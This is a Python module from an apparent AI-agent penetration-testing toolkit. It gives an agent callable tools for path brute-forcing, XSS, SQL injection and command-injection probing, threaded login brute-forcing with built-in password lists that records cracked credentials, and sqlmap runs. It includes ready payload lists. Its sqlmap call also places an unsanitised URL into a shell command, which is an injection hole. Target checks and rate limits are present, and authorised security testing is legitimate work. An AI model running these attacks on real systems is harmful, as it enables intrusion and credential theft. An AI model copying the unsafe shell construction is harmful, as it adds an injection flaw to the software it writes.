#airecon2 web offensive tools - rate-limited, capped, audited.
import json
import re
import threading
import time
import urllib.request
import urllib.error
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse, urlencode

from .gate import check_target, _audit
from .. import report as _report
from ..report import capture_intel as _capture_intel

_MAX_REQUESTS = 300       # hard cap per tool call
_DELAY = 0.05             # 20 req/s max
UA = "airecon2-offsec/0.2 (authorized testing)"

_XSS_PROBES = [
    "<script>alert(1)</script>", '"><svg onload=alert(1)>', "javascript:alert(1)",
    "<img src=x onerror=alert(1)>", "{{7*7}}", "${7*7}",
]
_SQLI_PROBES = [
    "' OR '1'='1", "1' ORDER BY 10--", "1 UNION SELECT NULL,NULL--",
    "1 AND SLEEP(3)--", "1; SELECT 1--",
]
# DB error fingerprints - their presence in a response after a malformed payload
# is the classic error-based SQLi signal (works on DVWA, testphp, real apps).
_DB_ERRORS = [
    r"you have an error in your sql syntax",   # MySQL
    r"warning: mysql", r"mysql_fetch", r"mysqli",
    r"unterminated quoted string",              # PostgreSQL
    r"pg_query", r"psql",
    r"sqlite", r"sqllogic",                     # SQLite
    r"ora-\d{5}",                              # Oracle
    r"microsoft ole db", r"odbc", r"sql server", r"sqlsrv",   # MSSQL
    r"unclosed quotation mark",
    r"syntax error.*sql", r"sql syntax", r"invalid query", r"database error",
]
_CMD_PROBES = [   # time-based + echo-based, non-destructive
    "; echo airecon2_ce", "| echo airecon2_ce", "$(echo airecon2_ce)",
    "; ping -n 1 127.0.0.1", "| sleep 3", "$(sleep 3)",
]
_COMMON_PARAMS = ["id", "q", "search", "page", "user", "name", "file", "msg", "redirect", "next"]
_WORDLIST = [
    "admin", "login", "wp-admin", "dashboard", "api", "backup", ".env", ".git",
    "config", "phpmyadmin", "test", "dev", "staging", "old", "admin.php",
    "admin.html", "server-status", ".htaccess", "web.config", "db.sql",
    "robots.txt", "sitemap.xml", "uploads", "static", "assets", "docs",
    "api/v1", "api/v2", "graphql", "actuator", "console", "debug",
]
# curated credential lists - small on purpose (rate-limited tool), targeted at
# labs, test sites and self-hosted apps a student will actually meet.
_BRUTE_USERS = [
    "admin", "administrator", "root", "test", "demo", "user", "guest",
    "admin1", "manager", "postgres", "mysql", "dvwa", "sammy", "bjuka",
]
_BRUTE_PASSWORDS = [
    "admin", "password", "123456", "12345678", "qwerty", "letmein",
    "welcome", "admin123", "root", "toor", "test", "test123", "demo",
    "password123", "pass123", "guest", "user", "login", "abc123",
    "iloveyou", "dragon", "monkey", "changeme", "secret", "default",
]


class _NoRedirect(urllib.request.HTTPRedirectHandler):
    """Block auto-redirects so a 302 from a successful login is SEEN, not followed
    (following it would mask the success as a plain 200 - a missed crack)."""
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


_OPENER = urllib.request.build_opener(_NoRedirect)


def _get(url: str, timeout: int = 10):
    """GET returning (status, headers, body) - used by login field discovery."""
    r = urllib.request.Request(url, headers={"User-Agent": UA})
    try:
        with urllib.request.urlopen(r, timeout=timeout) as resp:
            return resp.status, dict(resp.headers), resp.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers or {}), (e.read() or b"").decode("utf-8", errors="replace")
    except Exception as e:
        return 0, {}, str(e)


def _discover_login_fields(url: str) -> dict:
    """Parse a login page for the form's user/password input names and the POST target.
    Returns {} when the page is not an obvious form."""
    _s, _h, body = _get(url)
    if not body:
        return {}
    forms = re.findall(r"<form[^>]*>.*?</form>", body, re.S | re.I)
    for form in forms:
        if not re.search(r"type\s*=\s*[\"']?password", form, re.I):
            continue
        action_m = re.search(r"action\s*=\s*[\"']([^\"']*)[\"']", form, re.I)
        action = action_m.group(1) if action_m else ""
        names = re.findall(r"<input[^>]*name\s*=\s*[\"']([^\"']+)[\"'][^>]*>", form, re.I)
        user_field = pass_field = ""
        for tag in re.findall(r"<input[^>]*>", form, re.I):
            nm = re.search(r"name\s*=\s*[\"']([^\"']+)[\"']", tag)
            if not nm:
                continue
            n = nm.group(1)
            if re.search(r"type\s*=\s*[\"']?password", tag, re.I):
                pass_field = pass_field or n
            elif re.search(r"type\s*=\s*[\"']?(hidden|submit|checkbox|radio)\b", tag, re.I):
                continue
            else:
                user_field = user_field or n
        if pass_field:
            if action.startswith("http"):
                post_url = action
            elif action:
                from urllib.parse import urljoin
                post_url = urljoin(url, action)
            else:
                post_url = url
            extra = {n: "1" for n in names if n not in (user_field, pass_field)}
            return {"post_url": post_url, "user_field": user_field or "username",
                    "pass_field": pass_field, "extra_fields": extra}
    return {}


def _req(url: str, method: str = "GET", timeout: int = 10):
    r = urllib.request.Request(url, method=method, headers={"User-Agent": UA})
    try:
        with urllib.request.urlopen(r, timeout=timeout) as resp:
            return resp.status, len(resp.read()), dict(resp.headers)
    except urllib.error.HTTPError as e:
        return e.code, 0, dict(e.headers or {})
    except Exception as e:
        return 0, 0, {"error": str(e)}


def _paced(count: int) -> bool:
    if count > _MAX_REQUESTS:
        return False
    time.sleep(_DELAY)
    return True


def dirbuster(base_url: str, wordlist: list | None = None, **_) -> str:
    host = check_target(base_url)
    _audit("DIRBUSTER", f"{host}")
    words = wordlist or _WORDLIST
    base = base_url.rstrip("/") + "/"
    found, count = [], 0
    # baseline 404 shape
    b_status, b_len, _ = _req(base + "___airecon2_nope___")
    for w in words:
        count += 1
        if not _paced(count):
            break
        s, ln, _h = _req(base + w)
        # hit = different status than baseline, or same status but very different size
        if s and (s != b_status or abs(ln - b_len) > 200):
            found.append({"path": "/" + w, "status": s, "bytes": ln})
    return json.dumps({"target": host, "checked": count, "found": found}, indent=1)


def param_fuzz(url: str, **_) -> str:
    host = check_target(url)
    _audit("PARAM_FUZZ", f"{host}")
    sep = "&" if "?" in url else "?"
    results = []
    count = 0
    for p in _COMMON_PARAMS:
        count += 1
        if not _paced(count):
            break
        u = f"{url}{sep}{p}=airecon2probe"
        s, ln, _h = _req(u)
        results.append({"param": p, "status": s, "bytes": ln,
                        "reflected": "airecon2probe" in str(_h)})
    return json.dumps({"target": host, "probes": results}, indent=1)


def xss_probe(url: str, param: str = "q", **_) -> str:
    host = check_target(url)
    _audit("XSS_PROBE", f"{host} param={param}")
    sep = "&" if "?" in url else "?"
    hits = []
    count = 0
    for payload in _XSS_PROBES:
        count += 1
        if not _paced(count):
            break
        u = f"{url}{sep}{param}={urlencode({param: payload})[len(param)+1:]}"
        s, ln, _h = _req(u)
        body = ""
        try:
            r = urllib.request.Request(u, headers={"User-Agent": UA})
            with urllib.request.urlopen(r, timeout=10) as resp:
                body = resp.read().decode("utf-8", errors="replace")
        except Exception:
            pass
        reflected = payload in body
        if reflected:
            hits.append({"payload": payload, "status": s, "note": "reflected unencoded"})
    return json.dumps({"target": host, "param": param, "reflected_hits": hits,
                       "note": "reflection is a lead; verify exploitability manually"}, indent=1)


def sqli_probe(url: str, param: str = "id", **_) -> str:
    host = check_target(url)
    _audit("SQLI_PROBE", f"{host} param={param}")
    sep = "&" if "?" in url else "?"
    base_s, base_len, _ = _req(url)
    base_body = _get(url)[2] if url else ""
    base_errors = _db_error_signatures(base_body)
    hits = []
    count = 0
    for payload in _SQLI_PROBES:
        count += 1
        if not _paced(count):
            break
        u = f"{url}{sep}{param}={payload.replace(' ', '%20')}"
        t0 = time.time()
        s, ln, _h = _req(u, timeout=15)
        dt = time.time() - t0
        body = _get(u, timeout=15)[2]
        sig = []
        if s != base_s and s:
            sig.append(f"status {base_s}->{s}")
        if abs(ln - base_len) > 300:
            sig.append(f"size {base_len}->{ln}")
        if "SLEEP" in payload and dt > 2.8:
            sig.append(f"time-based ({dt:.1f}s)")
        new_errors = _db_error_signatures(body) - base_errors
        if new_errors:
            sig.append(f"db error in response: {sorted(new_errors)}")
        if sig:
            hits.append({"payload": payload, "signals": sig})
    return json.dumps({"target": host, "param": param, "sqli_leads": hits,
                       "note": "signals are leads; call sqli_confirm for sqlmap proof"}, indent=1)


def _db_error_signatures(body: str) -> set:
    """Return the DB error fingerprints present in a response body."""
    found = set()
    low = body.lower()
    for pat in _DB_ERRORS:
        if re.search(pat, low):
            found.add(pat)
    return found


def cmd_probe(url: str, param: str = "host", **_) -> str:
    host = check_target(url)
    _audit("CMD_PROBE", f"{host} param={param}")
    sep = "&" if "?" in url else "?"
    hits = []
    count = 0
    for payload in _CMD_PROBES:
        count += 1
        if not _paced(count):
            break
        u = f"{url}{sep}{param}={urllib.parse.quote(payload)}"
        t0 = time.time()
        s, ln, _h = _req(u, timeout=15)
        dt = time.time() - t0
        try:
            r = urllib.request.Request(u, headers={"User-Agent": UA})
            with urllib.request.urlopen(r, timeout=15) as resp:
                body = resp.read().decode("utf-8", errors="replace")
        except Exception:
            body = ""
        sig = []
        if "airecon2_ce" in body:
            sig.append("echo marker in response (RCE likely)")
        if ("sleep" in payload or "ping" in payload) and dt > 2.8:
            sig.append(f"time-based ({dt:.1f}s)")
        if sig:
            hits.append({"payload": payload, "signals": sig})
    return json.dumps({"target": host, "param": param, "cmd_leads": hits}, indent=1)


def login_bruteforce(url: str, param_user: str = "", param_pass: str = "",
                     users: list | None = None, passwords: list | None = None, **_) -> str:
    """Credential attack on a login form. Auto-discovers the form fields when
    param_user/param_pass are not given. Every hit AND every attempt is written to
    workspace/intel.txt (sensitive-intel file) and hits also go to credentials.txt."""
    host = check_target(url)
    _audit("LOGIN_BRUTE", f"{host}")

    disc = {}
    if not (param_user and param_pass):
        disc = _discover_login_fields(url)
        if disc:
            param_user = param_user or disc["user_field"]
            param_pass = param_pass or disc["pass_field"]
            url = disc.get("post_url") or url
            if disc.get("extra_fields"):
                _audit("LOGIN_BRUTE", f"form extras: {list(disc['extra_fields'])}")

    users = [u for u in (users or _BRUTE_USERS) if u][:20]
    passwords = [p for p in (passwords or _BRUTE_PASSWORDS) if p][:40]
    sep = "&" if "?" in url else "?"
    bl_s, bl_len, _ = _req(url, method="POST")

    # parallel credential attack (hydra-style): 10 workers, one global pacer so
    # the combined rate stays at ~20 req/s regardless of network latency.
    lock = threading.Lock()
    state = {"tries": 0, "errors": 0}
    pairs = [(u, p) for u in users for p in passwords][:600]

    def _try_pair(pair):
        u, pw = pair
        with lock:
            state["tries"] += 1
            time.sleep(_DELAY)
        data = dict(disc.get("extra_fields", {}))
        data[param_user] = u
        data[param_pass] = pw
        body = urlencode(data).encode()
        r = urllib.request.Request(url, data=body, method="POST",
                                   headers={"User-Agent": UA,
                                            "Content-Type": "application/x-www-form-urlencoded"})
        try:
            with _OPENER.open(r, timeout=10) as resp:
                s, ln, loc = resp.status, len(resp.read()), resp.headers.get("Location", "")
        except urllib.error.HTTPError as e:
            s = e.code
            ln = len(e.read() or b"")
            loc = e.headers.get("Location", "") if e.headers else ""
        except Exception:
            with lock:
                state["errors"] += 1
            return None
        redirected_away = 300 <= s < 400 and loc and "login" not in loc.lower()
        status_differs = s and s not in (bl_s, 200, 401, 403)
        body_changed = s == bl_s and abs(ln - bl_len) > 300
        if redirected_away or status_differs or body_changed:
            return {"user": u, "password": pw, "status": s, "location": loc,
                    "note": "differs from failed-login baseline - verify manually"}
        return None

    hits = []
    with ThreadPoolExecutor(max_workers=10) as pool:
        for res in pool.map(_try_pair, pairs):
            if res:
                hits.append(res)
    tries, errors = state["tries"], state["errors"]

    result = {
        "target": host, "form_discovered": bool(disc), "fields": {
            "post_url": url, "user": param_user, "pass": param_pass},
        "attempts": tries, "request_errors": errors, "candidate_creds": hits,
        "note": "verify hits manually; all attempts logged to workspace/intel.txt",
    }
    if not disc and not (param_user and param_pass):
        result["no_login_form_detected"] = True
        result["hint"] = ("this page has no HTML login form - run dirbuster first to find a "
                          "login page (e.g. /login, /admin) and point login_bruteforce at it")
    # ---- sensitive intel capture: attempts + hits, always ----
    _capture_intel("LOGIN_BRUTEFORCE",
                   f"target={host} form_fields={param_user or '(auto)'}/{param_pass or '(auto)'} "
                   f"users={len(users)} passwords={len(passwords)}")
    _capture_intel("ATTEMPTS", f"users={users} passwords={passwords}")
    for h in hits:
        _capture_intel("CREDENTIAL", f"{h['user']}:{h['password']} @ {host} status={h['status']}")
        _report.append_cred(f"{h['user']}:{h['password']}")
    return json.dumps(result, indent=1)


def sqli_confirm(url: str, param: str = "id", **_) -> str:
    """Confirm a sqli_probe lead with sqlmap in the lab (GET target, level 1-2,
    non-destructive flags). Results land in workspace/sqlmap_<host>/ and any
    credentials/dumps found are captured to workspace/intel.txt."""
    host = check_target(url)
    _audit("SQLMAP", f"{host} param={param}")
    from . import lab
    if not lab.lab_available():
        return json.dumps({"error": "sqli_confirm needs the Docker lab (sqlmap)",
                           "hint": "cd lab && docker compose up -d --build"}, indent=1)
    outdir = f"/workspace/sqlmap_{re.sub(r'[^A-Za-z0-9._-]', '_', host)}"
    cmd = (f"sqlmap -u '{url}' -p {param} --batch --level=2 --risk=1 "
           f"--threads=4 --output-dir={outdir} 2>&1 | tail -40")
    r = lab.lab_exec(cmd, timeout=580)
    out = str(r.get("output", ""))
    # harvest proof lines + any dumps sqlmap printed
    conf = {}
    m = re.search(r"Type:\s*(\S+)" , out)
    if m:
        conf["type"] = m.group(1)
    m = re.search(r"Payload:\s*(.+)", out)
    if m:
        conf["payload"] = m.group(1).strip()
    m = re.search(r"back-end DBMS:\s*(.+)", out)
    if m:
        conf["dbms"] = m.group(1).strip()
    if re.search(r"is 'AND|OR|time-based|boolean|error-based|UNION", out, re.I) or conf:
        conf["vulnerable"] = True
        _capture_intel("SQLI_CONFIRMED", f"{url} param={param} {json.dumps(conf)}")
    dumps = re.findall(r"(\S+\.csv|Table:\s*\S+|ENTRY\s*\(.+?\))", out)
    if dumps:
        _capture_intel("SQLI_DUMP_LEADS", json.dumps(dumps[:20], ensure_ascii=False))
    return json.dumps({"target": host, "param": param, "output_dir": outdir,
                       "confirmed": conf, "raw_tail": out[-2500:]}, indent=1)


SCHEMAS = [
    {"type": "function", "function": {"name": "dirbuster", "description": "Brute-force common paths/directories on an authorized target.",
        "parameters": {"type": "object", "properties": {"base_url": {"type": "string"}}, "required": ["base_url"]}}},
    {"type": "function", "function": {"name": "param_fuzz", "description": "Discover hidden parameters by probing common names.",
        "parameters": {"type": "object", "properties": {"url": {"type": "string"}}, "required": ["url"]}}},
    {"type": "function", "function": {"name": "xss_probe", "description": "Test a parameter for reflected XSS payloads (non-destructive).",
        "parameters": {"type": "object", "properties": {"url": {"type": "string"}, "param": {"type": "string"}}, "required": ["url"]}}},
    {"type": "function", "function": {"name": "sqli_probe", "description": "Test a parameter for SQL injection signals (error/time-based, non-destructive).",
        "parameters": {"type": "object", "properties": {"url": {"type": "string"}, "param": {"type": "string"}}, "required": ["url"]}}},
    {"type": "function", "function": {"name": "cmd_probe", "description": "Test a parameter for OS command injection signals (echo/time-based).",
        "parameters": {"type": "object", "properties": {"url": {"type": "string"}, "param": {"type": "string"}}, "required": ["url"]}}},
    {"type": "function", "function": {"name": "login_bruteforce", "description": "Credential attack on a login form. Auto-discovers form fields if not given; tests common credential pairs (audited, logged).",
        "parameters": {"type": "object", "properties": {"url": {"type": "string", "description": "Login page or form POST URL"}, "param_user": {"type": "string", "description": "username field name (auto-discovered if omitted)"}, "param_pass": {"type": "string", "description": "password field name (auto-discovered if omitted)"}, "users": {"type": "array", "items": {"type": "string"}, "description": "optional custom user list"}, "passwords": {"type": "array", "items": {"type": "string"}, "description": "optional custom password list"}},
                       "required": ["url"]}}},
    {"type": "function", "function": {"name": "sqli_confirm", "description": "Confirm a SQL injection lead with sqlmap in the lab (non-destructive, GET target). Dumps go to workspace/sqlmap_<host>/.",
        "parameters": {"type": "object", "properties": {"url": {"type": "string"}, "param": {"type": "string", "description": "vulnerable parameter name"}}, "required": ["url"]}}},
]

DISPATCH = {
    "dirbuster": dirbuster, "param_fuzz": param_fuzz, "xss_probe": xss_probe,
    "sqli_probe": sqli_probe, "cmd_probe": cmd_probe, "login_bruteforce": login_bruteforce,
    "sqli_confirm": sqli_confirm,
}
